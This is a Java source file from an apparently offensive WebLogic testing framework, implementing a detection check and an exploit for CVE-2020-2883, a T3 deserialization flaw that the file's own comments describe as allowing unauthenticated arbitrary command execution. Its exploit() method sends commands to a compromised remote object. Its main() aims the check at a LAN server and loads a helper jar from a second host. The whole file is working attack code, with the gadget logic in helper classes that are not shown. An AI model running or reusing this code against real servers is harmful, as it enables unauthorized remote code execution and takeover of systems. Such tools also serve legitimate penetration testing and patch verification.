/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.weblogic.framework.vuls.impl;
import com.weblogic.framework.gadget.impl.ReflectionExtractorGadget;
import com.weblogic.framework.entity.VulCheckParam;
import com.weblogic.framework.utils.PayloadUtils;
import com.weblogic.framework.utils.VulUtils;
import com.weblogic.framework.vuls.VulTest;
import javax.naming.Context;
import static com.weblogic.framework.utils.VersionUtils.getVersion;

/**
 * Title: CVE-2020-2883
 * Desc:
 * <p>
 *     CVE-2020-2883
 *     Oracle Fusion中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic服务器权限，执行任意命令。
 *     该漏洞主要为 CVE-2020-2555 基于 CommonsCollections2 （ExtractorComparator + PriorityQueue） 的绕过。
 *     漏洞影响版本:
 *     Oracle Coherence 3.7.1.17
 *     Oracle Coherence & Weblogic 12.1.3.0.0
 *     Oracle Coherence & Weblogic 12.2.1.3.0
 *     Oracle Coherence & Weblogic 12.2.1.4.0
 * </p>
 * Date: 2020/4/19 15:28
 *
 * @version 1.0.0
 */
public class CVE_2020_2883 implements VulTest {

    /**
     * 漏洞利用 jar 文件名称
     */
    private static final String[] VUL_DEPENDENCIES = new String[]{"coherence.jar"};

    /**
     * 漏洞影响版本
     */
    private static final String[] VUL_VERSIONS = new String[]{"12.1.3.0", "12.1.3.0.0", "12.2.1.3.0", "12.2.1.3.0.0", "12.2.1.4.0", "12.2.1.4.0.0"};

    /**
     * current context
     */
    private Context currentContext = null;

    /**
     * remote
     */
    private Object remote = null;

    /**
     * bind name
     */
    private String bindName;

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param url url
     * @param vulCheckParam 漏洞校验额外参数
     * @return
     * @throws Exception
     */
    @Override
    public Boolean vulnerable(String url, VulCheckParam vulCheckParam) throws Exception {
       return PayloadUtils.baseVulnerable(url, ReflectionExtractorGadget.class, this, vulCheckParam);
    }

    /**
     * 漏洞利用
     * @param url url
     * @param param 执行参数
     * @return
     * @throws Exception
     */
    @Override
    public String exploit(String url, String... param) throws Exception {
        return VulUtils.exploit(url, remote, param);
    }

    public static void main(String[] args) throws Exception {
        String url = "http://192.168.1.3:7001/";
        String javascriptUrl = "http://192.168.1.6:9999/com.bea.javascript.jar";
        VulCheckParam vulCheckParam = new VulCheckParam();
        vulCheckParam.setJavascriptUrl(javascriptUrl);
        vulCheckParam.setVersion(getVersion("192.168.1.3", 7001));
        vulCheckParam.setProtocol("t3");
        CVE_2020_2883 cve_2020_2883 = new CVE_2020_2883();
        System.out.println(cve_2020_2883.vulnerable(url,vulCheckParam));
    }
}
